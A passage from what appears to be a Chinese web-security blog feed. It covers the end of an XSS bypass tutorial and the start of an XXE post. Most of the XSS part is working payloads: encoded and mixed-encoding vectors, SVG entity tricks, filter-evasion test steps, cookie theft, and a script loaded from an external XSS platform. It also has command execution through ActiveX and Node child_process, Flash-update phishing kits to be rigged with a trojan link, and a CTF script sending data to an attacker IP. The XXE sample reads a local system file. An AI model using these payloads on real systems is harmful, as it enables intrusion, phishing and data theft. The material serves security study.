alt="img"></p><p>还有一种让八进制和十六进制编码的XSS攻击向量执行的方式便是将XSS向量放在某个能把字符串当做JavaScript代码来执行的函数里，比如eval()、setTimeout()、setInterval()等函数。如下示例：</p><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;eval(&quot;\141\154\145\162\164\50\42\170\163\163\42\51&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:eval(&quot;\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;</span><br></pre></td></tr></table></figure><p>或者也可以直接将一整段js代码编码后放入eval()函数中执行。</p><h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h2><p><strong>混合编码就是对一个XSS向量同时进行多种编码，如下示例：</strong></p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 对javascript:进行HTML编码, 对alert(&quot;xss&quot;)进行URL编码</span><br><span class="line">&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;%61%6c%65%72%74%28%22%78%73%73%22%29&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 对javascript:进行HTML编码, 对alert进行Unicode编码</span><br><span class="line">&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>也可以利用解码顺序进行混合编码，如下示例：</strong></p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><p>首先对“alert”进行JavaScript Unicode编码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>然后再对 <code>\u0061\u006c\u0065\u0072\u0074</code> 进行URL编码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>最后对标签中的 <code>javascript:%5c%75...%37%34(&quot;xss&quot;)</code> 整体进行HTML编码即可：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="SVG：XSS的一个黑魔法"><a href="#SVG：XSS的一个黑魔法" class="headerlink" title="SVG：XSS的一个黑魔法"></a>SVG：XSS的一个黑魔法</h2><p>我们在上文HTML编码那里最后留了一个坑，即HTML的五类元素中，像 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的原始文本元素在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符。</p><p>也就是说，向下面这样的代码，浏览器不会对其中的HTML实体字符进行解码，也就不会执行并触发XSS了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>那如何绕过HTML原始文本元素进而执行HTML实体解码呢，这涉及到了 <code>&lt;svg&gt;</code> 的魔力，那是一种特殊的触发效果，单纯script标签内加载html实体编码，只会当做文本，没有任何触发结果，如下图：</p><p>[<img src="/../images/20210523094715-cd264a4c-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094715-cd264a4c-bb68-1.png)</p><p>但是当在前面加上 <code>&lt;svg&gt;</code> 后，却成功弹窗了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094716-cd67709e-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094716-cd67709e-bb68-1.png)</p><p>这是为什么呢？</p><p>是因为 <code>&lt;svg&gt;</code> 标签属于HTML五大元素中的外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释，也就是说在解析到<code>&lt;svg&gt;</code> 标签时，浏览器就开始使用一套新的标准开始解析后面的内容，直到碰到闭合标签<code>&lt;/svg&gt;</code>。而在这一套新的标准遵循XML解析规则，在XML解析中，实体编码会自动解码成相应的字符，重新来一遍标签开启状态，此时就会执行XSS了。如下图，弹窗后我们查看页面源码。发现原本不能被HTML解码的内容被 <code>&lt;svg&gt;</code> 标签自动解码了：</p><p>[<img src="/../images/20210523094717-cde26b1e-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094717-cde26b1e-bb68-1.png)</p><h1 id="测试流程思路"><a href="#测试流程思路" class="headerlink" title="测试流程思路"></a>测试流程思路</h1><p>下面让我们来看一下XSS绕过的测试流程。</p><p>现实中，大多数的场所是用的黑名单来做XSS过滤器的，有三种方式绕过黑名单的测试：</p><ol><li>暴力测试（输入大量的payload，看返回结果）</li><li>根据正则推算</li><li>利用浏览器bug</li></ol><h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>（1）尝试插入比较正常的HTML标签，例如：<code>&lt;a&gt;</code>、<code>&lt;b&gt;</code>、<code>&lt;i&gt;</code>、<code>&lt;u&gt;</code> 等，来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。</p><p>（2）尝试插入不闭合的标签，例如：<code>&lt;a</code>、<code>&lt;b</code>、<code>i&gt;</code>、<code>u&gt;</code>、<code>&lt;img</code> 等，然后看一下返回响应，是否对开放的标签也有过滤。</p><p>（3）然后测试几种常见的XSS向量：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(1)&lt;/script&gt;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了 alert、prompt、confirm 等字符，再尝试大小写的组合：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;</span><br></pre></td></tr></table></figure><p>（4）如果过滤器仅仅是把 <code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签过滤掉，那么可以用双写的方式来绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p>这样当 <code>&lt;script&gt;</code> 标签被过滤掉后，剩下的组合起来刚好形成一个完整的向量。</p><p>（5）用 <code>&lt;a href</code> 标签来测试，看返回响应</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.baidu.com&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>看看 <code>&lt;a</code> 标签是否被过滤，href 是否被过滤，href里的数据是否被过滤了。如果没有数据被过滤，插入javascript伪协议看看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>看是否返回错误，javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符。</p><p>继续测试事件触发执行javascript：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=x onmouseover=alert(1)&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>看onmouseover事件是否被过滤。</p><p>测试一个无效的事件，看看他的过滤规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=x onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>是完整的返回了呢，还是跟onmouseover一样被干掉了。如果是完整的返回的话，那么就意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件，我们可以选用别的事件。测试一个很少见的事件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onhashchange=alert(1)&gt;&lt;a href=#&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><blockquote><p>onhashchange 事件在当前 URL 的锚部分(以 ‘#’ 号为开始) 发生改变时触发 。</p></blockquote><h2 id="测试其他标签和属性"><a href="#测试其他标签和属性" class="headerlink" title="测试其他标签和属性"></a>测试其他标签和属性</h2><p>HTML的标签和属性太多了，上文中已经列出了很多了。</p><h1 id="攻击面拓展"><a href="#攻击面拓展" class="headerlink" title="攻击面拓展"></a>攻击面拓展</h1><h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><h3 id="通过-XSS-盗取-Cookie"><a href="#通过-XSS-盗取-Cookie" class="headerlink" title="通过 XSS 盗取 Cookie"></a>通过 XSS 盗取 Cookie</h3><p>Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。最简单的比如：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> ，执行后会弹出当前页面的cookie信息。在目标没有“同源策略”的保护下，我们可以利用XSS盗取目标网站管理员的Cookie。</p><p>在一般的通用CMS下呢，为了通用模板的兼容性，许多CMS本身不会使用“同源策略”等其他手段来防护XSS漏洞，而是使用自建的过滤函数来处理，在这种情况下，一旦出现XSS漏洞，我们就可以直接获取目标的Cookie然后使用特定的方法来传输cookie。</p><p>这里，我们可以利用网上现成的或自己搭建的XSS平台来完成利用过程。</p><h3 id="Flash-弹窗钓鱼"><a href="#Flash-弹窗钓鱼" class="headerlink" title="Flash 弹窗钓鱼"></a>Flash 弹窗钓鱼</h3><ul><li>项目一地址：<a href="https://github.com/Wileysec/adobe-flash-phishing-page">https://github.com/Wileysec/adobe-flash-phishing-page</a></li></ul><p>该项目是模仿的 Flash Player 中文官网的页面：</p><p>[<img src="/../images/20210523094717-ce2b906e-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094717-ce2b906e-bb68-1.png)</p><p>需要在index.html中的加入我们制作的木马的链接地址：</p><p>[<img src="/../images/20210523094718-ce9bd752-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094718-ce9bd752-bb68-1.png)</p><ul><li>项目二地址：<a href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></li></ul><p>该项目是一个逼真的Flash更新提醒的弹窗，强迫症都会忍不住去点击下载的：</p><p>[<img src="/../images/20210523094718-ced9a208-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094718-ced9a208-bb68-1.png)</p><p>找到flash.js，搜索链接“<a href="https://www.se7ensec.cn/%E2%80%9D%EF%BC%8C%E5%B0%86%E5%85%B6%E6%94%B9%E4%B8%BA%E6%88%91%E4%BB%AC%E5%88%B6%E4%BD%9C%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%9A%84%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BF%9D%E5%AD%98%E5%8D%B3%E5%8F%AF%EF%BC%9A">https://www.se7ensec.cn/”，将其改为我们制作的木马的链接地址，然后保存即可：</a></p><p>[<img src="/../images/20210523094718-cefeb124-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094718-cefeb124-bb68-1.png)</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>为了大大提升 XSS 的危害，我们可以利用 JavaScript 来执行系统命令。</p><h3 id="使用-WScript-Shell-执行系统命令"><a href="#使用-WScript-Shell-执行系统命令" class="headerlink" title="使用 WScript.Shell 执行系统命令"></a>使用 WScript.Shell 执行系统命令</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul><li><p>Internet Explorer </p></li><li><p>在IE上打开设置中的Intertnet选项-“安全”-“自定义级别”-“对没有标记为安全的activex控件进行初始化和脚本运行-设置成启用，如下</p><p><img src="/../images/20190121110917-f04620ae-1d29-1-1686840019398.jpeg" alt="20190121110917-f04620ae-1d29-1"></p></li></ul><p>WScript.Shell（Windows Script Host Runtime Library）是一个对象，对应的文件是C:&#x2F;WINDOWS&#x2F;system32&#x2F;wshom.ocx，Wscript.shell是服务器系统会用到的一种组件。4这个对象可以执行操作系统外壳常用的操作，比如运行程序、读写注册表、环境变量等。简单使用如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shell = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);</span><br><span class="line">shell.<span class="title function_">run</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230524224855708-1686840019398.png" alt="image-20230524224855708"></p><p>有时候为了 Bypass 也可以使用 <code>String.fromCharCode</code> 从 Ascii 来转化恶意代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;eval(String.fromCharCode(10,118,97,114,32,111,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,115,104,101,108,108,39,41,59,10,111,46,114,117,110,40,39,99,97,108,99,46,101,120,101,39,41,59,10));&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="使用-child-process-执行系统命令"><a href="#使用-child-process-执行系统命令" class="headerlink" title="使用 child_process 执行系统命令"></a>使用 child_process 执行系统命令</h3><p>如果目标环境启用了 <strong>NodeJS</strong> 的话，我们也可以利用 NodeJS 的子进程（child_process）调用并执行系统命令：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;const exec = require(&#x27;child_process&#x27;).exec;exec(&#x27;whoami&#x27;).stdout.on(&#x27;data&#x27;, function (data) &#123;alert(data);&#125;)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;&lt;更多稀奇古怪的Payload&gt;&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>能执行系统命令了，那么 XSS 在钓鱼攻击中的作用便大大提高了，我们完全可以利用 XSS 反弹 Shell 并上线 Metasploit 或 CS 。</p><h3 id="Xmind-2020-XSS-to-RCE"><a href="#Xmind-2020-XSS-to-RCE" class="headerlink" title="Xmind 2020 XSS  to RCE"></a>Xmind 2020 XSS  to RCE</h3><p>漏洞利用很简单，在 “思维导图” 中输出 Payload：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094723-d1fa41ae-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094723-d1fa41ae-bb68-1.png)</p><p>切换到 “大纲” 中，按下一个功能键即可触发攻击：</p><p>[<img src="/../images/20210523094724-d23097e0-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094724-d23097e0-bb68-1.png)</p><p>由于 Xmind 启用了 NodeJS 功能，所以我们可以利用 child_process 调用并执行系统命令。</p><p>[<img src="/../images/20210523094724-d269b494-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094724-d269b494-bb68-1.png)</p><p>[<img src="/../images/20210523094725-d2c17756-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094725-d2c17756-bb68-1.png)</p><h3 id="蚁剑的XSS-to-RCE"><a href="#蚁剑的XSS-to-RCE" class="headerlink" title="蚁剑的XSS to RCE"></a>蚁剑的XSS to RCE</h3><p><a href="https://github.com/AntSwordProject/antSword/issues/147">https://github.com/AntSwordProject/antSword/issues/147</a></p><p><a href="https://xz.aliyun.com/t/8167#toc-0">浅谈蚁剑RCE - 先知社区</a></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源的定义</p><p><img src="/../images/pxbcwxexdh-1686840019399.png" alt="img"></p><p>同源的目的</p><blockquote><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p><p>设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？</p><p>很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p><p>由此可见，”同源政策”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p></blockquote><h2 id="如何跨域"><a href="#如何跨域" class="headerlink" title="如何跨域"></a>如何跨域</h2><ul><li><p>cors（支持所有http请求）</p><p>CORS（Cross-Origin Resource Sharing）是一种跨域资源共享机制，它允许Web应用程序从不同的域名访问资源，而不受同源策略的限制。CORS机制需要在服务端进行配置，并且需要在每个跨域请求中添加特定的HTTP头部信息，例如“Access-Control-Allow-Origin”和“Access-Control-Allow-Methods”等。CORS机制可以支持各种类型的HTTP请求，包括GET、POST、PUT、DELETE等，因此它在Web应用程序中的应用非常广泛。</p></li><li><p>jsonp（只支持get请求）</p><p>JSONP（JSON with Padding）是一种利用<script>标签的GET请求实现跨域数据传输的技术，它通过在请求URL中添加一个回调函数名来实现跨域访问。由于JSONP是基于<script>标签的GET请求，不具备修改数据的能力，因此它不会引起CSRF漏洞。但是，由于JSONP仅支持GET请求，因此它的应用场景受到限制。</p></li></ul><h4 id="xss跨域"><a href="#xss跨域" class="headerlink" title="xss跨域"></a>xss跨域</h4><p>引入其他恶意script代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="built_in">eval</span>(<span class="string">&#x27;window.s=document.createElement(&quot;script&quot;);window.s.src=&quot;//xsspt.com/XXcxou&quot;;document.body.appendChild(window.s)&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="跨源资源共享-CORS"><a href="#跨源资源共享-CORS" class="headerlink" title="跨源资源共享--CORS"></a>跨源资源共享--CORS</h2><p><a href="http://huang-x-h.github.io/2015/03/11/cors-preflight/">XMLHttpRequest跨域预检</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication</a></p><p>预检的response数据包</p><blockquote><p>Access-Control-Allow-Origin：告诉浏览器允许该源访问资源。<br>Access-Control-Expose-Headers：告诉浏览器允许获得除了基本响应头外的哪些响应头<br>Access-Control-Allow-Credentials: true 是否允许浏览器读取 response 的内容<br>Access-Control-Allow-Methods： 指定了访问资源时允许使用的请求方法<br>Access-Control-Allow-Headers： 指明了实际请求中允许携带的标头字段。</p></blockquote><p>携带cookie跨域</p><p><img src="/../images/image-20230320220034977-1686840019399.png" alt="image-20230320220034977"></p><p><a href="https://www.cnblogs.com/byErichas/p/15918919.html">https://www.cnblogs.com/byErichas/p/15918919.html</a></p><h2 id="绕过httponly"><a href="#绕过httponly" class="headerlink" title="绕过httponly"></a>绕过httponly</h2><h4 id="Apache-httpOnly-Cookie泄露-CVE-2012-0053"><a href="#Apache-httpOnly-Cookie泄露-CVE-2012-0053" class="headerlink" title="Apache httpOnly Cookie泄露( CVE-2012-0053)"></a>Apache httpOnly Cookie泄露( CVE-2012-0053)</h4><h4 id="CORS-cookie回显"><a href="#CORS-cookie回显" class="headerlink" title="CORS+cookie回显"></a>CORS+cookie回显</h4><p>例题</p><p><a href="https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss">https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss</a></p><p>条件1</p><blockquote><p>response数据包中</p><p>Access-Control-Allow-Headers: X-Requested-With，说明了我们可以通过<strong>XHR</strong>请求来访问网站</p><p><code>XMLHttpRequest</code>是用于在后台与服务器交换数据。如果设置XHR请求网站，那么请头部必然会带有：<code>Origin:xxx</code>，则会被服务器视为同源访问</p></blockquote><p>条件2</p><p>没有关闭debug模式，导致cookie回显</p><p><img src="/../images/39-1686840019399.png" alt="img"></p><p>利用<code>location.href</code>重定向到vps，从而带出cookie</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)&#123;</span><br><span class="line">        location.<span class="property">href</span>=<span class="string">&#x27;http://106.15.250.162:8888/?flag=&#x27;</span>+ xmlhttp.<span class="property">responseText</span>.<span class="title function_">match</span>(<span class="string">&#x27;flag\\&#123;(.\*?)\\&#125;&#x27;</span>)[<span class="number">1</span>]&#125;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;/index.php/treehole/view?id=&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.<span class="title function_">send</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="CST-trace请求"><a href="#CST-trace请求" class="headerlink" title="CST--trace请求"></a>CST--trace请求</h4><p>TRACE 方法会返回原始请求报文，其中就包含了cookie</p><p><a href="https://www.cnblogs.com/gaopei/p/11380349.html">https://www.cnblogs.com/gaopei/p/11380349.html</a></p><h2 id="JSONP劫持漏洞"><a href="#JSONP劫持漏洞" class="headerlink" title="JSONP劫持漏洞"></a>JSONP劫持漏洞</h2><p><a href="https://wolke.cn/post/c8aa67d0.html">CORS跨域漏洞与JSONP劫持 | wolke</a></p><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p><a href="https://xz.aliyun.com/t/12370#toc-25">https://xz.aliyun.com/t/12370#toc-25</a></p><blockquote><p>CSP指的是Content Security Policy，即内容安全策略。它是一种安全机制，用于保护网站免受跨站脚本攻击（XSS攻击）、数据盗取等Web攻击的影响。<br>CSP指令可以在HTTP响应头中设置，也可以在HTML文档中使用meta标签设置。<br>通过CSP，网站管理员可以告诉浏览器哪些资源可以加载到页面中，例如可以信任哪些来源的JavaScript、CSS、图片等资源。这样，浏览器就只会加载来自这些受信任来源的资源，从而减少了被恶意脚本攻击的风险。</p></blockquote><p><img src="/../images/image-20230512151453267-1686840019399.png" alt="image-20230512151453267"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul><li>CSP</li><li>html实体编码，黑名单，转义字符</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2023/06/01/XXE/"/>
      <url>/2023/06/01/XXE/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ol><li><p>定义</p><blockquote><p>XML是可扩展标记语言（eXtensible Markup Language）的缩写，它是是一种数据表示格式，可以描述非常 复杂的数据结构，常用于传输和存储数据。</p></blockquote></li><li><p>与html的联系和区别</p><ul><li>HTML 被设计用来显示数据</li><li>XML 被设计用来传输和存储数据</li></ul><blockquote><p>对 XML 最好的描述是：</p><p><strong>XML 是独立于软件和硬件的信息传输工具。</strong></p></blockquote></li><li><p>语法</p><p><img src="/../images/image-20220804165043284-1686034515882.png" alt="image-20220804165043284"></p></li><li><p>格式</p><ul><li><p>XML声明：版本，编码信息（可选，如果存在就必须放在文档的首行）</p></li><li><p>DTD:Document Type Definition 即文档类型定义 (可选)</p></li><li><p>文档元素</p></li><li><p>典型xml文档例子</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this 